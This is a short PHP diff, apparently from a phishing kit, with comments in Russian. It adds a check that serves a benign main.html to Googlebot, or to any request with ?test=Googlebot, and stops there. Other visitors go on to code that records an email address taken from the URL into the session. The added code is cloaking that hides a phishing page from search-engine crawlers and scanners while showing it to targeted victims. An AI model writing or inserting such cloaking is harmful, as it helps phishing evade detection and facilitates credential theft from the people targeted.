@@ -1,4 +1,14 @@
 <?php
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+// Проверяем, является ли User-Agent строкой Googlebot
+if (strpos($userAgent, 'Googlebot') !== false || @$_GET['test'] == "Googlebot") {
+    // Это Googlebot, выполнение скрипта прекращается
+   echo file_get_contents("main.html");
+   die();
+}
+
+
 session_start();
 $_SESSION['key'] = md5(@$_GET['e']);
 $_SESSION['mail'] = @$_GET['e'];
